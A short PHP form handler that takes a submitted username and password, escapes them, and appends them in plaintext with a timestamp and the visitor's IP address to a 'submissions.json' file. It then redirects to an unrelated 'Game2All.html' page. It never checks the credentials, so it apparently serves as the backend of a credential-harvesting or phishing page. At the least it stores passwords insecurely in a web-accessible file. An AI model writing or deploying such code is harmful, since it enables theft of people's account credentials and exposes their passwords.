<?php
if ($_SERVER["REQUEST_METHOD"] == "POST")
{
	// Get form data
	$username = htmlspecialchars(trim($_POST["username"]));
	$password = htmlspecialchars(trim($_POST["password"]));

	// Validation
	$errors = [];

	if (empty($username))
		$errors[] = "Username is required";

	if (empty($password))
		$errors[] = "Password is required";

	// If no errors, save to file
	if (empty($errors))
	{
		// Create data array
		$submission =
		[
			"timestamp" => date("Y-m-d H:i:s"),
			"username" => $username,
			"password" => $password,
			"ip_address" => $_SERVER["REMOTE_ADDR"] ?? "Unknown"
		];

		// Convert to JSON
		$data = json_encode($submission).PHP_EOL;

		// Save to file
		$filename = "submissions.json";
		
		if (file_put_contents($filename, $data, FILE_APPEND | LOCK_EX))
		{
			// Success - redirect to success page
			header("Location: Game2All.html");
			exit();
		}
		else
		{
			// Error saving file
			header("Location: index.php?error=1");
			exit();
		}
	}
	else
	{
		// Validation errors
		header("Location: index.php?error=1");
		exit();
	}
}
else
{
	// If not POST request, redirect to form
	header("Location: index.php");
	exit();
}
?>
